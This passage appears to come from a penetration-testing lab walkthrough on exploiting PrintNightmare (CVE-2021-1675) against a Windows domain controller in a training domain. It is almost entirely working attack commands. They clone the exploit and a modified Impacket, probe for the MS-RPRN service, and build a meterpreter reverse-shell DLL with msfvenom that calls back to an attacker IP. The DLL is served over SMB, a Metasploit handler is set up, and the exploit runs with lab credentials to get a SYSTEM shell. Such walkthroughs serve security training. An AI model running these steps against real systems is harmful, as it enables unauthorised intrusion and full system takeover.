
```ruby
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

For this exploit to work successfully, we will need to use cube0x0's version of Impacket. We may need to uninstall the version of Impacket on our attack host and install cube0x0's

#### Install cube0x0's Version of Impacket

```ruby
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

We can use `rpcdump.py` to see if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.


#### Enumerating for MS-RPRN


```ruby
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using `msfvenom`.

```ruby
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```


We will then host this payload in an SMB share we create on our attack host using `smbserver.py`.

```ruby
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

Once the share is created and hosting our payload, we can use MSF to configure & start a multi handler responsible for catching the reverse shell that gets executed on the target.


#### Configuring & Starting MSF multi/handler

```
use exploit/multi/handler
```
```
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```
```
set LHOST 172.16.5.225
```
```
set LPORT 8080
```
```
run
```

With the share hosting our payload and our multi handler listening for a connection, we can attempt to run the exploit against the target. The command below is how we use the exploit:

#### Running the Exploit

```ruby
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

If all goes well after running the exploit, the target will access the share and execute the payload. The payload will then call back to our multi handler giving us an elevated SYSTEM shell.




